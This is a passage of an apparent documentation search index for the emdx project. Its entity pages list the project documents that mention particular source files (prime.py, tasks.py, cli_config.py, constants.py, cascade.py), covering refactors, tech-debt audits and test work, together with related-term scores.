</li> <li> <p>#6369 Delegate: Re-implement the Knowledge Decay feature (originally PR #451)   Section: New Commands</p> </li> <li><code>emdx/commands/stale.py</code> - New command module</li> <li><code>emdx/main.py</code> - Register commands</li> <li><code>emdx/commands/prime.py</code> - Integration with prime --verbose</li> <li> <p><code>tests/test_commands_stale.py</code> - 19 tests for the new feature</p> </li> <li> <p>#6348 Delegate: Rebase the feat/smart-priming branch onto main and resolve a [1/5]   Section: Rebase feat/smart-priming onto main</p> </li> <li>File: <code>emdx/commands/prime.py</code></li> <li>Issue: Import section conflict between main (simple datetime import) and feature branch (additional imports for subprocess, timedelta, Optional)</li> <li> <p>**Resolutio...</p> </li> <li> <p>#6342 Delegate: Document #6330 (Delegate synthesis [synthesis]):</p> </li> </ol>"},{"location":"entities/emdxcommandsprimepy/#2-emdxcommandsprimepy","title":"2. <code>emdx/commands/prime.py</code>","text":"<p>Added three components:</p>"},{"location":"entities/emdxcommandsprimepy/#phase-1-git-context-in-prime-high-priority","title":"Phase 1: Git Context in Prime (HIGH priority)","text":"<p>Add <code>_get_git_context()</code> to <code>emdx/commands/prime.py</code>:</p>"},{"location":"entities/emdxcommandsprimepy/#files-changed","title":"Files Changed","text":""},{"location":"entities/emdxcommandsprimepy/#conflict-resolution","title":"Conflict Resolution","text":""},{"location":"entities/emdxcommandsprimepy/#emdx-arc-212","title":"EMDX Arc [2/12]","text":"<p>Section: Changes Made</p> <ul> <li> <p>#6227 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: 1. <code>except Exception: pass</code> - Complete Silent Failures (31 instances)</p> <p>...s | | <code>emdx/commands/status.py</code> | 216-218 | DB query failure silently ignored | | <code>emdx/commands/prime.py</code> | 334-336 | DB query failure silently ignored | | <code>emdx/commands/core.py</code> | 321-322 | Gist metadata save failure silently ignored | | `emdx/ui/search/search_screen....</p> </li> <li> <p>#6220 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: \ud83d\udd34 CRITICAL: Silent Failures (except: pass)</p> <p>...| 321-322 | Gist creation silently fails (non-fatal but no logging) | MEDIUM | | <code>emdx/commands/prime.py</code> | 334-336 | Cascade stage query silently fails | MEDIUM | | <code>emdx/commands/status.py</code> | 37-38 | Timestamp parsing silently returns None | LOW | | `emdx/commands/sta...</p> </li> <li> <p>#6185 Gameplan: Simplify Task System for Agent Use   Section: Implementation Steps</p> <p>...ions.py`</p> </li> <li>Remove <code>emdx/commands/executions.py</code> if task-execution-only</li> <li>Update <code>emdx/commands/prime.py</code> to filter delegate tasks</li> <li>Update CLAUDE.md task instructions</li> <li> <p>Clean up stale tasks in DB (optional migration or manual)</p> </li> <li> <p>#6142 Delegate: Read gameplan by running: emdx view 6102. Implement the Know [6/7]   Section: New Commands</p> </li> <li><code>emdx/commands/stale.py</code> (new) - Stale command implementation</li> <li><code>emdx/commands/touch.py</code> (new) - Touch command implementation</li> <li><code>emdx/commands/prime.py</code> - Added --smart flag</li> <li> <p><code>emdx/main.py</code> - Registered new commands</p> </li> <li> <p>#6138 Delegate: Read gameplan by running: emdx view 6099. Implement the Smar [3/7]   Section: Smart Priming Feature Implementation Complete</p> </li> <li> <p><code>emdx/commands/prime.py</code> - Added 357 lines implementing smart priming logic</p> </li> <li> <p>#6280 Delegate: DEBT-5: Fix silent exception handlers   Section: Files Modified</p> <ol> <li>emdx/commands/prime.py (lines 334-336)</li> </ol> </li> <li>Added <code>import logging</code> and <code>logger = logging.getLogger(__name__)</code></li> <li>Cascade status: Now logs when cascade_stage column doesn't exist</li> </ul>"},{"location":"entities/emdxcommandsprimepy/#2-updated-imports-10-files","title":"2. Updated Imports (10 files)","text":"<ul> <li><code>emdx/commands/prime.py</code> - get_git_project</li> <li><code>emdx/commands/core.py</code> - get_git_project</li> <li><code>emdx/commands/delegate.py</code> (4 locations) - create_worktree_simple, cleanup_worktree</li> <li>`emdx/ui/acti...</li> </ul>"},{"location":"entities/emdxcommandsprimepy/#files-changed_1","title":"Files Changed","text":""},{"location":"entities/emdxcommandsprimepy/#files-changed_2","title":"Files changed","text":""},{"location":"entities/emdxcommandsprimepy/#related-entities","title":"Related Entities","text":"<ul> <li><code>_output_text()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.4)</li> <li><code>key docs</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.4)</li> <li><code>tests/test_commands_prime.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.4)</li> <li><code>text output</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.4)</li> <li><code>recent_failures</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.4)</li> <li><code>git log --oneline -3</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.4)</li> <li><code>git branch --show-current</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.4)</li> <li><code>_get_recent_failures()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.4)</li> <li><code>#id \"title\" \u2014 n views</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.4)</li> <li><code>total estimated effort:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> </ul>"},{"location":"entities/emdxcommandstaskspy/","title":"emdx/commands/tasks.py","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2026-02-13</p>"},{"location":"entities/emdxcommandstaskspy/#documents-10","title":"Documents (10)","text":"<ul> <li> <p>#6694 Fix emdx delete auto-confirm for non-TTY   Section: What was done</p> <p>...on | | <code>emdx/commands/trash.py</code> | Guard restore --all and purge confirmations | | <code>emdx/commands/tasks.py</code> | Guard task delete confirmation | | <code>emdx/commands/executions.py</code> | Guard kill_all confirmation | | <code>emdx/commands/tags.py</code> | Guard rename, merge, batch confirmati...</p> </li> <li> <p>#6687 Fix emdx delete auto-confirm for non-TTY   Section: Changes</p> <p>...mations)</p> </li> <li><code>emdx/commands/trash.py</code> \u2014 <code>purge</code> and <code>restore --all</code> confirmations</li> <li><code>emdx/commands/tasks.py</code> \u2014 <code>task delete</code> confirmation</li> <li><code>emdx/commands/executions.py</code> \u2014 <code>exec killall</code> confirmation</li> <li> <p><code>emdx/commands/tags.py</code> \u2014 <code>tag rename</code>, <code>tag merge</code>, <code>tag batch</code> confir...</p> </li> <li> <p>#6610 Delegate: Search the entire emdx codebase for every import or referenc [2/2]   Section: Production Code \u2014 UI/Display Emojis (NOT in EMOJI_ALIASES)</p> <p>...11, 157, 262-266, 283, 303-307, 349, 393, 437 | \u2705\ud83d\udccb\ud83d\udcdd\ud83c\udff7\ufe0f | Groups command output | | <code>emdx/commands/tasks.py</code> | 82, 460 | \u2705 | Task add/delete confirmation | | <code>emdx/commands/tags.py</code> | 160, 254, 304, 359, 384, 389, 415 | \u2705\ud83c\udff7\ufe0f\ud83d\udd0d | Tag command output | | `emdx/commands/trash.py...</p> </li> <li> <p>#6287 Delegate: DEBT-18: Add missing test coverage for task commands   Section: DEBT-18: Task Command Test Coverage</p> </li> <li> <p>#6185 Gameplan: Simplify Task System for Agent Use   Section: Implementation Steps</p> <ol> <li>Rewrite <code>emdx/commands/tasks.py</code> \u2014 replace 12 commands with 4 (add, ready, done, list, delete)</li> </ol> </li> <li>Add filtering to exclude delegate tasks from agent-facing queries</li> <li> <p>Remove <code>task_executions</code> table...</p> </li> <li> <p>#6180 Delegate: Task System Comprehensive Analysis [15/15]   Section: Core Components</p> <p>3. Task CLI (<code>emdx/commands/tasks.py</code>)</p> </li> <li><code>create</code>: Create task with priority, gameplan, dependencies</li> <li><code>list/show</code>: View tasks with filtering by status/gameplan/project</li> <li> <p><code>update</code>: Change status, prio...</p> </li> <li> <p>#6171 Delegate: Systematic cross-cutting grep for ALL references to removed  [10/17]   Section: 4. Workflow Execution Type \u2014 RUNTIME CONCERN (3 hits)</p> <p>File: <code>emdx/commands/tasks.py</code></p> </li> <li> <p>#6167 Delegate: Analyze how tasks appear in the TUI. Read emdx/ui/browser_co [6/15]   Section: Files Examined</p> <p>...ity_data.py<code>| Data loader \u2014 loads groups, docs, cascades, agents (NOT tasks) | |</code>emdx/commands/tasks.py<code>| CLI commands for task management | |</code>emdx/models/tasks.py` | Task CRUD operations |</p> </li> <li> <p>#6166 Delegate: Analyze how tasks integrate with cascade. Read emdx/commands [5/15]   Section: Current State</p> </li> <li>Purpose: Track work items with dependencies</li> <li>Statuses: open, active, blocked, done, failed</li> <li> <p>Execution model: DAG-based with <code>task_deps</code> table for d...</p> </li> <li> <p>#6163 Delegate: Analyze the emdx task CLI commands. Read emdx/commands/tasks [2/15]   Section: EMDX Task CLI Commands Analysis</p> <p>File: <code>emdx/commands/tasks.py</code> (358 lines) Model: <code>emdx/models/tasks.py</code> (309 lines) Task Runner: <code>emdx/services/task_runner.py</code> (150 lines)</p> </li> </ul>"},{"location":"entities/emdxcommandstaskspy/#summary","title":"Summary","text":"<p>Added comprehensive test coverage for the task CLI commands module (<code>emdx/commands/tasks.py</code>) which previously had 0% coverage.</p>"},{"location":"entities/emdxcommandstaskspy/#task-system-emdxmodelstaskspy-emdxcommandstaskspy","title":"Task System (<code>emdx/models/tasks.py</code>, <code>emdx/commands/tasks.py</code>)","text":""},{"location":"entities/emdxcommandstaskspy/#related-entities","title":"Related Entities","text":"<ul> <li><code>sys.stdin.isatty()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>is_non_interactive()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>depends</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>task delete</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>what was done</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>task runner</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>emdx/services/task_runner.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>emdx/commands/trash.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>emdx/commands/executions.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.4)</li> <li><code>emdx/models/task_executions.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.4)</li> </ul>"},{"location":"entities/emdxconfigcliconfigpy/","title":"emdx/config/cli_config.py","text":"<p>Type: tech_term | Mentioned in: 11 documents | First seen: 2026-02-14</p>"},{"location":"entities/emdxconfigcliconfigpy/#documents-11","title":"Documents (11)","text":"<ul> <li>#6872 Delegate: Document #6864 (Delegate synthesis [synthesis]):</li> </ul>"},{"location":"entities/emdxconfigcliconfigpy/#synthes-34","title":"Synthes [3/4]","text":"Method Lines Status <code>TaggingConfig.add_rule()</code> 121-125 Dead \u2014 never called <code>TaggingConfig.remove_rule()</code> 127-133 Dead \u2014 never called <code>TaggingConfig.get_rule()</code> 135-137 Dead \u2014 never... <ul> <li> <p>#6600 Delegate: Fix PR #689 on branch delegate/remove-any-remaining-referenc   Section: 7 conflicted files resolved:</p> File Resolution <code>emdx/config/cli_config.py</code> Kept main's version (already had Cursor removed, correct model) <code>emdx/services/claude_executor.py</code> Kept main + removed remaining Cursor comment reference </li> <li> <p>#6510 None Type Analysis [7/7]</p> <p><code>emdx/utils/output_parser.py</code></p> </li> </ul> Line Annotation Reason Unnecessary 15 <code>extract_output_doc_id() -&gt; int \\| None</code> NECESSARY - ID may not be found"},{"location":"entities/emdxconfigcliconfigpy/#25-emdxconfigcli_configpy","title":"25. <code>emdx/config/cli_config.py</code>","text":"<p>| Line |...</p> <ul> <li>#6469 Centralized Configuration Constants for EMDX   Section: Updated Files </li> <li><code>emdx/config/cli_config.py</code> - Uses model constants</li> <li><code>emdx/config/constants.py</code> - Central location for all constants</li> <li><code>emdx/config/__init__.py</code> - Exports all new constants</li> <li> <p>`emdx/utils/envir...</p> </li> <li> <p>#6361 Delegate: DEBT-7: Centralize configuration constants in emdx. Currentl [1/2]   Section: 2. Updated files to use centralized constants:</p> <p>..._TIMEOUT | | <code>emdx/services/ask_service.py</code> | Use DEFAULT_CLAUDE_SONNET_MODEL | | <code>emdx/config/cli_config.py</code> | Use DEFAULT_CLAUDE_MODEL, DEFAULT_CLAUDE_SONNET_MODEL, ENV_CLI_TOOL | | <code>emdx/services/cli_executor/factory.py</code> | Use ENV_CLI_TOOL | | <code>emdx/main.py</code> | Use ENV_SA...</p> </li> <li> <p>#6284 Delegate: DEBT-7: Centralize configuration   Section: Changes Made</p> <p>...H_CHECK_TIMEOUT_SECONDS</p> </li> <li><code>emdx/config/__init__.py</code> - Exports all new constants</li> <li><code>emdx/config/cli_config.py</code> - Uses CLAUDE_MODEL and ENV constants</li> <li><code>emdx/config/constants.py</code> - Added 104 new lines of constants</li> <li> <p><code>emdx/models/executions.py</code> - Uses STALE_EXECUTION_TIMEO...</p> </li> <li> <p>#6269 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [25/37]   Section: 4. Files Updated to Use Centralized Constants</p> <p>...<code>GITHUB_AUTH_TIMEOUT</code></p> </li> <li><code>emdx/commands/maintain.py</code> - Uses <code>PROCESS_*_TIMEOUT</code></li> <li><code>emdx/config/cli_config.py</code> - Uses model constants</li> <li><code>emdx/services/ask_service.py</code> - Uses <code>DEFAULT_ASK_MODEL</code></li> <li><code>emdx/services/cli_executor/claude.py</code> - Uses <code>CLI_VERSION_CHECK_TIMEOUT</code></li> <li> <p>`em...</p> </li> <li> <p>#6266 Delegate: Document #6230 (Delegate: Audit CONFIGURATION DEBT in the emdx project)   Section: Files Modified</p> <ol> <li><code>emdx/config/models.py</code> (NEW)</li> </ol> </li> <li><code>emdx/config/constants.py</code> (+118 lines)</li> <li><code>emdx/config/cli_config.py</code> (use centralized models)</li> <li><code>emdx/services/ask_service.py</code> (use centralized constants)</li> <li><code>emdx/commands/delegate.py</code> (use timeout/branch constants)</li> <li> <p>`emdx/utils/...</p> </li> <li> <p>#6585 Delegate: Remove any remaining references to 'cursor' or 'Cursor' in c [2/2]   Section: Files Modified</p> <ol> <li>emdx/config/cli_config.py \u2014 Major cleanup</li> </ol> </li> <li>Removed \"Cursor\" from module docstring</li> <li>Removed Cursor-specific comments from <code>CliConfig</code> fields</li> <li> <p>Removed <code>CURSOR = \"cursor\"</code> from `Cl...</p> </li> <li> <p>#6341 Delegate: R4: Centralize configuration constants. Create emdx/constant   Section: Changes Made</p> <p>...ervices/ask_service.py** - Uses DEFAULT_ASK_MODEL instead of hardcoded string</p> </li> <li>emdx/config/cli_config.py - Uses CLAUDE_OPUS_MODEL and CLAUDE_SONNET_MODEL</li> <li>emdx/services/claude_executor.py - Uses DEFAULT_CLI_TIMEOUT_SECONDS and SUBPROCESS_SHORT_TIMEOUT_SECONDS 8....</li> </ul>"},{"location":"entities/emdxconfigcliconfigpy/#configuration-and-utilities","title":"Configuration and Utilities","text":""},{"location":"entities/emdxconfigcliconfigpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx/config/settings.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>validate_env_var(name, value)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>validate_database_url()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>validate_api_key(raise_on_missing=false)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>validate_all_env_vars()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>use centralized constants</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>timeout constants:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>summary centralized</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>single source of truth</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>single source</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> </ul>"},{"location":"entities/emdxconfigconstantspy/","title":"emdx/config/constants.py","text":"<p>Type: tech_term | Mentioned in: 12 documents | First seen: 2026-01-10</p>"},{"location":"entities/emdxconfigconstantspy/#documents-12","title":"Documents (12)","text":"<ul> <li>#6872 Delegate: Document #6864 (Delegate synthesis [synthesis]):</li> </ul>"},{"location":"entities/emdxconfigconstantspy/#synthes-34","title":"Synthes [3/4]","text":""},{"location":"entities/emdxconfigconstantspy/#1-emdxconfigconstantspy-38-dead-constants","title":"1. <code>emdx/config/constants.py</code> \u2014 38 dead constants","text":"<p>Every constant below appears only at its definition site. No imports outside <code>config/</code> (including <code>__init__.py</code> re-exports that are themselves never imported).</p> <ul> <li> <p>#6469 Centralized Configuration Constants for EMDX   Section: Overview</p> <p>...uts, model names, and environment variables into a single configuration module at <code>emdx/config/constants.py</code>. This effort was completed on 2026-02-14 as part of a security and technical debt audit.</p> </li> <li> <p>#6367 Gameplan: emdx compact \u2014 AI-Powered KB Synthesis   Section: Key Files</p> <p>...| <code>emdx/services/document_merger.py</code> | EXTEND | Add <code>group_clusters()</code> method | | <code>emdx/config/constants.py</code> | EXTEND | Add <code>COMPACT_*</code> constants | | <code>emdx/main.py</code> | EXTEND | Register command | | <code>tests/test_compact.py</code> | NEW | Test suite |</p> </li> <li> <p>#6361 Delegate: DEBT-7: Centralize configuration constants in emdx. Currentl [1/2]   Section: DEBT-7: Centralize Configuration Constants</p> </li> <li> <p>#6340 Delegate: Truncate Function Consolidation [1/12]   Section: Changes Made</p> <p>...now emit <code>DeprecationWarning</code> and delegate to <code>truncate()</code></p> </li> <li> <p>Uses constants from <code>emdx/config/constants.py</code> for default lengths</p> </li> <li> <p>#6338 Architecture Improvements: Implementation Summary   Section: Status: Improvements Already Implemented</p> <p>...function now exists that all variant functions delegate to</p> </li> <li>Uses constants from <code>emdx/config/constants.py</code> (TITLE_TRUNCATE_LENGTH, etc.)</li> <li> <p>Deprecated wrappers (<code>truncate_title</code>, <code>truncate_description</code>, <code>truncate_path</code>, <code>truncate_text</code>) remain for backward compatibility w...</p> </li> <li> <p>#6284 Delegate: DEBT-7: Centralize configuration   Section: DEBT-7: Centralize Configuration</p> </li> <li> <p>#6269 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [25/37]</p> </li> </ul>"},{"location":"entities/emdxconfigconstantspy/#summary","title":"Summary","text":"<p>Centralized scattered configuration constants (timeouts, model names, environment variable names) into <code>emdx/config/constants.py</code>.</p>"},{"location":"entities/emdxconfigconstantspy/#summary_1","title":"Summary","text":"<p>Centralized hardcoded timeout values, model name strings, and environment variable names into <code>emdx/config/constants.py</code>.</p>"},{"location":"entities/emdxconfigconstantspy/#changes-made","title":"Changes Made","text":""},{"location":"entities/emdxconfigconstantspy/#1-new-timeout-constants-in-emdxconfigconstantspy","title":"1. New Timeout Constants in <code>emdx/config/constants.py</code>","text":"Constant Value Purpose <code>CASCADE_IMPLEMENTATION_TIMEOUT</code> 1800s (30 min) Planned stage execution (writes code) `CASCADE_S... <ul> <li>#6266 Delegate: Document #6230 (Delegate: Audit CONFIGURATION DEBT in the emdx project)   Section: Files Modified <ol> <li><code>emdx/config/models.py</code> (NEW)</li> </ol> </li> <li><code>emdx/config/constants.py</code> (+118 lines)</li> <li><code>emdx/config/cli_config.py</code> (use centralized models)</li> <li><code>emdx/services/ask_service.py</code> (use centralized constants)</li> <li> <p><code>emdx/commands/delegate.py</code> (u...</p> </li> <li> <p>#6224 Dead Code Audit: emdx project - 2026-02-14   Section: Unused Constants (High Confidence)</p> <p>Many constants in <code>emdx/config/constants.py</code> appear unused:</p> </li> <li> <p>#6171 Delegate: Systematic cross-cutting grep for ALL references to removed  [10/17]   Section: 3. Workflow Constants \u2014 DEAD CODE (5 hits)</p> <p>File: <code>emdx/config/constants.py</code></p> </li> <li> <p>#4422 Tech Debt Discovery - Discovery Synthesis   Section: Positive Findings</p> <ol> <li>Centralized Constants (<code>emdx/config/constants.py</code>):</li> </ol> </li> <li>Well-organized magic numbers</li> <li>Good documentation</li> <li>All timeouts, thresholds, and limits in one place</li> </ul>"},{"location":"entities/emdxconfigconstantspy/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx/config/settings.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.1)</li> <li><code>validate_env_var(name, value)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>validate_database_url()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>validate_api_key(raise_on_missing=false)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>validate_all_env_vars()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>truncate()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>tests/test_text_formatting.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>summary centralized</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>single source of truth</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>single source</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> </ul>"},{"location":"entities/emdxdatabasecascadepy/","title":"emdx/database/cascade.py","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-13</p>"},{"location":"entities/emdxdatabasecascadepy/#documents-8","title":"Documents (8)","text":"<ul> <li>#6530 Delegate: Review GitHub PR #651 using 'gh pr view 651' and 'gh pr diff [2/4]   Section: \u2705 Strengths <p>...ll related code comprehensively:</p> </li> <li><code>emdx/commands/cascade.py</code> (783 lines)</li> <li><code>emdx/database/cascade.py</code> (375 lines)</li> <li><code>emdx/services/cascade_service.py</code> (195 lines)</li> <li><code>emdx/ui/cascade/</code> directory (6 files, ~1,175 lines)</li> <li><code>docs/cascade.md</code> (326 lines)</li> <li> <p>Re...</p> </li> <li> <p>#6505 None Type Analysis [3/7]</p> <p>However, keeping it allows explicit override, so marking as acceptable. ---</p> </li> </ul>"},{"location":"entities/emdxdatabasecascadepy/#file-emdxdatabasecascadepy","title":"File: <code>emdx/database/cascade.py</code>","text":""},{"location":"entities/emdxdatabasecascadepy/#function-parameters-with-none","title":"Function Parameters with <code>| None</code>","text":"<p>| Location | Current Signature | Verdict | Reasoning | |----------|-------------------|---------|...</p> <ul> <li>#6500 None Type Analysis [3/7]   Section: Files Analyzed <ol> <li><code>emdx/database/documents.py</code></li> </ol> </li> <li><code>emdx/database/__init__.py</code></li> <li><code>emdx/database/groups.py</code></li> <li><code>emdx/database/cascade.py</code></li> <li><code>emdx/database/search.py</code></li> <li><code>emdx/database/migrations.py</code></li> <li> <p><code>emdx/database/connection.py</code></p> </li> <li> <p>#6431 Add cascade TypedDicts to database and service layers   Section: Changes Made</p> <p>Updated: <code>emdx/database/cascade.py</code></p> </li> <li><code>get_cascade_metadata()</code> \u2192 <code>CascadeMetadata | None</code></li> <li><code>list_documents_at_stage()</code> \u2192 <code>list[CascadeDocumentListItem]</code></li> <li><code>get_cascade_stats()</code> \u2192 <code>CascadeStats</code></li> <li> <p>`...</p> </li> <li> <p>#6419 Type System Audit: Replace Any/None with Concrete Types [synthesis]   Section: Scope of Changes</p> <p>...ons | Critical | | <code>emdx/database/documents.py</code> | 12 functions | High | | <code>emdx/database/cascade.py</code> | 7 functions | High | | <code>emdx/database/groups.py</code> | 8 functions | Medium | | <code>emdx/models/categories.py</code> | 2 functions | Medium | | <code>emdx/models/tags.py</code> | 2 f...</p> </li> <li> <p>#6389 Delegate: Fix cascade stage update race condition (Issue #622)   Section: Fix: Cascade stage update race condition (Issue #622)</p> </li> </ul> <pre><code>return cursor.rowcount &gt; 0 or stage is not None\n</code></pre> <p>Always returned <code>True</code> when <code>stage</code> was n...</p> <ul> <li> <p>#6232 Delegate: Audit TYPE SAFETY DEBT in the emdx project: Find missing typ [9/14]   Section: HIGH Severity - Could use TypedDict or more specific types</p> <p>...ervices/cascade_service.py:30,62<code>| Cascade activity data as</code>Dict[str, Any]<code>| |</code>emdx/database/cascade.py:33<code>|</code>get_cascade_metadata<code>returns</code>dict[str, Any]<code>| |</code>emdx/database/documents.py:52<code>|</code>get_document<code>returns</code>Optional[dict[str, Any]]<code>| |</code>emdx/ui/command_pa...</p> </li> <li> <p>#6155 Delegate: Audit the emdx CLI for dead/unused features that should be r [1/3]   Section: 2. Legacy Cascade Functions in documents.py</p> <p>New Location: All functionality exists in <code>emdx/database/cascade.py</code></p> </li> </ul>"},{"location":"entities/emdxdatabasecascadepy/#problem","title":"Problem","text":"<p>In <code>emdx/database/cascade.py</code> <code>update_cascade_stage()</code> (line 57-87), the return statement:</p>"},{"location":"entities/emdxdatabasecascadepy/#related-entities","title":"Related Entities","text":"<ul> <li><code>cascademetadata</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>cascade_stage</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>list_documents_at_stage()</code> 